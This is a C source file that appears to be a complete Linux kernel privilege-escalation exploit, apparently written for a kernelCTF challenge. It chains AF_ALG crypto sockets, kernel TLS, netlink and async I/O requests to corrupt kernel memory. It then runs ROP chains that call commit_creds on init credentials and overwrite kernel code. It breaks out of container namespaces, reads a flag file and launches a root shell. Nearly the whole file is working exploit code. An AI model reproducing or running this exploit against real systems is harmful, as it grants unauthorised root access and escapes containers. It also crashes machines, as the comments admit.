#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <linux/xfrm.h>
#include <linux/pfkeyv2.h>

#include <linux/pkt_cls.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <keyutils.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/if_packet.h>
#include <netinet/tcp.h>
#include <linux/tls.h>
#include <linux/if_alg.h>
#include <math.h>
#include <libaio.h>

#include "kernelver_17412.294.29.h"

static char *g_mmapped_buf;
static uint64_t g_kernel_text;

uint64_t leak_kernel_text();

#ifdef DEBUG
#define err(errcode, msg, ...) \
        do { \
                perror(msg); \
                sleep(1000); \
        } while (0)
#define errx(errcode, msg, ...) \
        do { \
                puts(msg); \
                sleep(1000); \
        } while (0)
#endif


void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void get_kctf_flag()
{
        char buf[512];


        int fd = open("/flag", O_RDONLY);

        if (fd < 0)
                return;

        size_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
                printf("Flag:\n");

                write(1, buf, n);

                printf("\n");
        }

        close(fd);
}

static char *g_sh_argv[] = {"sh", NULL};

static int g_status;

#define MMAP_SIZE 0x10000

static int g_pwned;
static char *g_rop2;
static size_t g_rop2_len;

#define ROP2_CONST_AREA 0x10
#define ROP2_CONST_OFFSET 0x200

#define KOFFSET(x) (x-0xffffffff81000000uL)

uint64_t kaddr(uint64_t addr)
{
        return g_kernel_text + addr - 0xffffffff81000000uL;
}

void __attribute__((naked)) get_root()
{
        asm volatile(
                "push %r15\n"
                "push %r14\n"
                "push %r13\n"
                "push %r12\n"
                "push %rbx\n"
                "push %rbp\n"
                "lea -0x18fb41(%rip), %r15\n"
        );
        asm volatile(
                "lea (%%r15,%0), %%rdi\n"
                "lea (%%r15,%1), %%r12\n"
                "call *%%r12\n"
                :: 
                "r" (KOFFSET(INIT_CRED)),
                "r" (KOFFSET(COMMIT_CREDS))
        );

        asm volatile(
                "lea (%%r15,%0), %%r12\n"
                "mov $1, %%rdi\n"
                "call *%%r12\n"
                "mov %%rax, %%r13\n"
                :: 
                "r" (KOFFSET(FIND_TASK_BY_VPID))
        );

        asm volatile(
                "lea (%%r15,%0), %%rsi\n"
                "mov %%r13, %%rdi\n"
                "lea (%%r15,%1), %%r12\n"
                "call *%%r12\n"
                :: 
                "r" (KOFFSET(INIT_NSPROXY)),
                "r" (KOFFSET(SWITCH_TASK_NAMESPACES))
        );

        asm volatile(
                "lea (%%r15,%0), %%rax\n"
                "pop %%rbp\n"
                "pop %%rbx\n"
                "pop %%r12\n"
                "pop %%r13\n"
                "pop %%r14\n"
                "pop %%r15\n"
                "jmp *%%rax\n"
                :: 
                "r" (KOFFSET(RETURN_THUNK))
        );

}

void __attribute__((naked)) after_pwn()
{
        g_pwned = 1;


        set_cpu(1);

        int pid = fork();

        if (!pid) {

        if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0)
                perror("setns");

        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);

        printf("\nGot root!!!\n");
        printf("Getting kctf flags ...\n");

        get_kctf_flag();

        printf("Launching shell, system will crash when you exit because I didn't bother with recovery ...\n");
        execve("/bin/sh", g_sh_argv, NULL);
        _exit(0);
        }

        waitpid(pid, &g_status, 0);

       

        printf("Shell exited, sleeping for 30 seconds, after that system might crash\n");

        sleep(30);
        _exit(0);
}


void rop_rax2rdi(uint64_t **rop_p)
{
        uint64_t *rop = *rop_p;

        *(uint64_t *) (g_rop2+ROP2_CONST_OFFSET) = kaddr(POP_RDI); // RCX == RW_BUFFER 

// rax -> rdi
        *rop++ = kaddr(POP_RCX);
        *rop++ = kaddr(RW_BUFFER+ROP2_CONST_OFFSET); 
        *rop++ = kaddr(PUSH_RAX_JMP_QWORD_RCX);

        *rop_p = rop;
}

void rop_patch_kernel_code(uint64_t **rop_p, uint64_t dst, uint64_t src, size_t len)
{
        uint64_t *rop = *rop_p;
        *rop++ = kaddr(POP_RDI);
        *rop++ = dst & (~0xfff);
        *rop++ = kaddr(POP_RSI);
        *rop++ = 1;
        *rop++ = kaddr(SET_MEMORY_RW);

        *rop++ = kaddr(POP_RDI_RSI_RDX_RCX);
        *rop++ = dst;
        *rop++ = src;
        *rop++ = len;
        *rop++ = 0xdeadbeef;
        *rop++ = kaddr(COPY_USER_GENERIC_STRING);

        *rop_p = rop;
}

size_t prepare_rop2(uint64_t *rop2)

{
        uint64_t *rop2_start = rop2;

        rop_patch_kernel_code(&rop2, kaddr(SYS_KEXEC_FILE_LOAD), (uint64_t) get_root, 0x200);

        *rop2++ = kaddr(POP_RDI);
        *rop2++ = 10000000;
        *rop2++ = kaddr(MSLEEP);

        return (char *) rop2 - (char *) rop2_start;
}

void setup_tls(int sock, int is_rx)
{
        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0)
                err(1, "setsockopt");
        
        static struct tls12_crypto_info_aes_ccm_128 crypto_info = {.info.version = TLS_1_2_VERSION, .info.cipher_type = TLS_CIPHER_AES_CCM_128};

        if (setsockopt(sock, SOL_TLS, is_rx ? TLS_RX : TLS_TX, &crypto_info, sizeof(crypto_info)) < 0)
                err(1, "TLS_TX");
}

int only_connect(int port)
{
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(port);

        if (connect(sock, &addr, sizeof(addr)) < 0)
                err(1, "connect");


        setup_tls(sock, 0);

        return sock;

}


int prepare_netlink_listener(unsigned int port_id)
{
        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
        if (sock == -1) {
                err(1, "socket netlink\n");
        }
        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_pid = port_id;
        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)))
                err(1, "bind netlink fail\n");

        return sock;
}

int main(int argc, char **argv)
{
        int ret;
        struct rlimit rlim;

        system("cat /proc/cpuinfo");
        if (argc > 1 && (argv[1][0] == 'f' || argv[1][0] == '0')) {
                g_kernel_text = strtoull(argv[1], NULL, 16);
        } else {
                g_kernel_text = leak_kernel_text();
        }

        rlim.rlim_cur = rlim.rlim_max = 4096;
        if (setrlimit(RLIMIT_NOFILE, &rlim) < 0)
                err(1, "setrlimit()");

        g_mmapped_buf = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (g_mmapped_buf == MAP_FAILED) {
                perror("mmap");
                return 1;
        }

        memset(g_mmapped_buf, 0, MMAP_SIZE);

#define ROP2_MMAP_SIZE 0x4000
        g_rop2 = mmap(NULL, ROP2_MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_LOCKED, -1, 0);
        if (g_rop2 == MAP_FAILED)
                err(1, "mmap");

        struct timeval time;
        gettimeofday(&time,NULL);

        srand((time.tv_sec * 1000) + (time.tv_usec / 1000));

        set_cpu(0);

        struct msghdr msg = {};
        struct cmsghdr *cmsg;
        struct af_alg_iv *iv;
        struct iovec iov;
        char cbuf[CMSG_SPACE(4) + CMSG_SPACE(20)] = {0};

        msg.msg_control = cbuf;
        msg.msg_controllen = sizeof(cbuf);

        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_OP;
        cmsg->cmsg_len = CMSG_LEN(4);
        *(__u32 *)CMSG_DATA(cmsg) = ALG_OP_ENCRYPT;

        cmsg = CMSG_NXTHDR(&msg, cmsg);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_IV;
        cmsg->cmsg_len = CMSG_LEN(20);
        iv = (void *)CMSG_DATA(cmsg);
        iv->ivlen = 8;        

        iov.iov_base = g_mmapped_buf;
        iov.iov_len = 4096;

        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        struct sockaddr_alg sa = {
                .salg_family = AF_ALG,
                .salg_type = "skcipher",
                .salg_name = "cryptd(rfc3686(ctr(aes-generic)))"
        };

#define IOCB_CNT 1500

        int sockets[IOCB_CNT];
        int sockets2[IOCB_CNT];
        for (int i = 0; i < IOCB_CNT; i++)
        {
                sockets[i] = socket(AF_ALG, SOCK_SEQPACKET, 0);
                if (bind(sockets[i], (struct sockaddr *)&sa, sizeof(sa)) < 0)
                        err(1, "af_alg bind");

                if (setsockopt(sockets[i], SOL_ALG, ALG_SET_KEY, g_mmapped_buf, 20) < 0)
                        err(1, "set key");

                sockets2[i] = accept(sockets[i], NULL, 0);
                if (sockets[i] < 0)
                        err(1, "accept");
                if (sendmsg(sockets2[i], &msg, 0) < 0)
                        err(1, "sendmsg2");
        }

        struct sockaddr_alg sa3 = {
                .salg_family = AF_ALG,
                .salg_type = "skcipher",
                .salg_name = "cryptd(ctr(aes-generic))"
        };

        int c1 = socket(AF_ALG, SOCK_SEQPACKET, 0);
        struct sockaddr_alg sa2 = {
                .salg_family = AF_ALG,
                .salg_type = "aead",
                .salg_name = "ccm_base(cryptd(ctr(aes-generic)),cbcmac(aes-aesni))"
        };

        if (bind(c1, (struct sockaddr *)&sa2, sizeof(sa)) < 0)
                err(1, "af_alg bind");


        struct sockaddr_in addr, peer_addr;
        memset(&addr, 0, sizeof(addr));
        char buf[256];
        struct iocb iocbs[IOCB_CNT];
        struct iocb *iocb_ptrs[IOCB_CNT];
        io_context_t ctx;

        memset(&ctx, 0, sizeof(ctx));

        io_setup(IOCB_CNT, &ctx);

        int sock_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (sock_serv < 0)
                err(1, "socket");

        int flag = 1;
        setsockopt(sock_serv, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));

        memset(&addr, 0, sizeof(addr));

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(7777);

        if (bind(sock_serv, &addr, sizeof(addr)) < 0)
                err(1, "connect");

        listen(sock_serv, 99999);

        int sock_client_tls = only_connect(7777);

        socklen_t sz;
        int sock = accept(sock_serv, &peer_addr, &sz);

        if (sock < 0)
                err(1, "accept");

        setup_tls(sock, 1);

        int sock_nl_srv = prepare_netlink_listener(5555);
        int sock_nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
        if (sock_nl == -1) {
                err(1, "socket netlink\n");
        }

        struct sockaddr_nl nl_addr;
        memset(&nl_addr, 0, sizeof(nl_addr));
        nl_addr.nl_family = AF_NETLINK;
        nl_addr.nl_pid = 5555;
        
        if (connect(sock_nl, (struct sockaddr *) &nl_addr, sizeof(nl_addr)) < 0)
                err(1, "connect netlink");

        for (int i = 0; i < IOCB_CNT; i++)
        {
                iocb_ptrs[i] = &iocbs[i];

                if (i == (IOCB_CNT - 2)) {
                        io_prep_pwrite(&iocbs[i], sock_client_tls, buf, 1, 0);
                } else if (i == (IOCB_CNT - 1)) {
                        io_prep_pwrite(&iocbs[i], sock_nl, g_mmapped_buf, 3200, 0);
                } else {
                        io_prep_pread(&iocbs[i], sockets2[i], buf, 1, 0);
                }
        }

        g_rop2_len = prepare_rop2((uint64_t *) g_rop2);
        if (g_rop2_len > ROP2_CONST_OFFSET)
                err(1, "Stage 2 ROP size too big: %d > %d\n", g_rop2_len, ROP2_CONST_OFFSET);

        char *backlog = g_mmapped_buf + 0x7d8;

       
// ->complete
/*
0xffffffff81dab07a:     mov rax, qword ptr [rdi + 0xc8]
0xffffffff81dab081:     mov ebx, 1
0xffffffff81dab086:     test rax, rax
0xffffffff81dab089:     je 0xffffffff81dab0a3
0xffffffff81dab08b:     mov rsi, rdi
0xffffffff81dab08e:     mov rcx, r14
0xffffffff81dab091:     mov rdi, rbp
0xffffffff81dab094:     mov rdx, r15
0xffffffff81dab097:     call    __x86_indirect_thunk_rax
*/
        *(uint64_t *) (backlog + 0x10) = kaddr(G1);
        *(uint64_t *) (backlog + 0xc8) = kaddr(PUSH_RSI_JMP_QWORD_RSI_39);
        *(uint64_t *) (backlog + 0x39) = kaddr(POP_RSP);

        uint64_t *rop = (uint64_t *) (backlog);
        *rop++ = kaddr(POP_RSI_RDI);
        *rop++ = (uint64_t) g_rop2;
        rop += 1;

        *rop++ = kaddr(POP_R8_RDI_RSI_RDX_RCX);
        rop += 5;

        *rop++ = kaddr(POP_RDX_RDI);
        *rop++ = ROP2_CONST_OFFSET + ROP2_CONST_AREA;
        *rop++ = kaddr(RW_BUFFER);
        *rop++ = kaddr(POP_RSI);
        *rop++ = (uint64_t) g_rop2;
        *rop++ = kaddr(COPY_USER_GENERIC_STRING);
        *rop++ = kaddr(POP_RSP);
        *rop++ = kaddr(RW_BUFFER);

        io_submit(ctx, IOCB_CNT, iocb_ptrs);
        
        sleep(0.5);

        syscall(__NR_kexec_file_load);

        after_pwn();

        return 0;
}
